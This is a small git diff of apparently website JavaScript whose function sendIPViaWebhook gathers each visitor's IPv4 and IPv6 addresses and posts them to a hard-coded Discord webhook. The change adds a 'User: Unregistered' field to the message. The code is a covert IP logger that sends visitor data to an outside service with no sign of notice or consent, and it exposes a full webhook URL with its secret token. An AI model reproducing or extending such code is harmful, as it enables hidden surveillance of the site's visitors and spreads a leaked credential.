@@ -379,11 +379,11 @@ async function getUserIPv6Address() {
 async function sendIPViaWebhook() {
   const uinfo1 = await getUserIPAddress();
   const uinfo2 = await getUserIPv6Address();
-
+  const uinfo3 = "Unregistered"
   const webhookURL = 'https://discord.com/api/webhooks/1187164716980785223/PLQjmGNi2-zqSHtfNyTjMpGfOosQPaOJkhU8rdLxmGbWwqRnAxJnkdTexKEuU7thAWAe';
-  
+
   const data = {
-    content: `Person entered the website! \nIpv4: ${uinfo1} \nIpv6: ${uinfo2}`
+    content: `Person entered the website! \nIpv4: ${uinfo1} \nIpv6: ${uinfo2} \nUser: ${uinfo3}`
   };
 
   try {
